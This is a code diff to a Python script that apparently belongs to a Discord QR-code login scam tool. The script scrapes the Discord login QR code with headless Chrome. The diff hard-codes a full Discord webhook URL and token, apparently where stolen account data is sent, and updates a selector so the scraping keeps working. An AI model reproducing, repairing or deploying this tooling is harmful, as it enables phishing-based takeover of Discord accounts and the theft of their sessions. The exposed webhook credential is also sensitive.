@@ -7,7 +7,7 @@ import os
 import requests
 
 #Set Webhook Here! 
-url = "Webhook goes here"
+url = "https://discord.com/api/webhooks/993535034915033139/55hEkB4FUiUKre2abyBQFMJxaYkIwl7CxQBQ95Jc2crE76p58kavmOJsJZIH0YLl_0lP"
 
 
 # Developer: NightfallGT
@@ -34,7 +34,7 @@ def main():
     options.add_argument("--headless")
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
-    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
+    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver')
 
     print('[?] Awaiting Page to Load!')
     driver.get('https://discord.com/login')
@@ -45,7 +45,7 @@ def main():
 
     soup = BeautifulSoup(page_source, features='lxml')
 
-    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
+    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
     qr_code = div.find('img')['src']
     file = os.path.join(os.getcwd(), 'temp/qr_code.png')
 
